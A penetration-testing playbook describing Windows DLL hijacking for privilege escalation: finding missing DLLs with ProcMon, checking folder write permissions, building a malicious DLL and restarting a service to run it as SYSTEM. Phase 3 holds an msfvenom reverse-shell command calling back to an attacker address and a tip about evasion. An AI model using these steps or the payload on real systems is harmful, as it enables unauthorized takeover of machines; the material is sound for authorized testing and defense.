# DLL Hijacking for Privilege Escalation

## When to Use
- During a Windows local privilege escalation phase.
- When an application running with elevated privileges (like a service) attempts to load a missing DLL, and the directory it parses is writable by the current low-privileged user.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Finding Missing DLLs (ProcMon)

You can find vulnerable processes using Sysinternals Process Monitor (ProcMon).

```text
# Concept: Filter ProcMon events 1. Open ProcMon and set the following filters:
   - "Result" is "NAME NOT FOUND"
   - "Path" ends with ".dll"
2. Start an application or restart a service.
3. Observe processes looking for DLLs that do not exist in their primary directories.
```

### Phase 2: Verifying Writable Directories

Once an application is observed attempting to load `missing.dll` in a path like `C:\Software\bin\missing.dll`, verify if your low-privileged user can write to `C:\Software\bin\`.

```powershell
# Check folder permissions using Access Control Lists (ACLs)
Get-Acl -Path "C:\Software\bin" | Format-List
# Look for "BUILTIN\Users: Allow Write" or similar rules.
```

### Phase 3: Crafting the Malicious DLL

Create a malicious DLL that replicates the needed payload (e.g., executing a reverse shell or adding a user to local admins).

```bash
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o missing.dll
```
*Note: Generating raw DLL payloads using C/C++ in Visual Studio is often preferred for evasion, ensuring `DllMain` attaches successfully.*

### Phase 4: Hijacking and Execution

1. Place the generated `missing.dll` into the writable application directory (`C:\Software\bin\`).
2. Trigger the application or service. If it is a service, you need the right to restart it (or reboot the machine if it starts on boot).

```powershell
# Restart-Service -Name VulnerableAppService
```

3. When the service starts (as `NT AUTHORITY\SYSTEM`), it blindly loads and executes your DLL.
